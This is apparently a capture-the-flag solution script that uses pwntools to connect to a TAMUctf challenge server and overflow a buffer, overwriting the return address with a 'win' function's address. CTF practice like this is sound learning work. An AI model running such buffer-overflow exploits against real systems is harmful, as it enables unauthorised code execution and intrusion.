from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")
e = ELF('./trivial')
p.sendline(b'A'*0x58+p64(e.symbols['win']))
p.interactive()
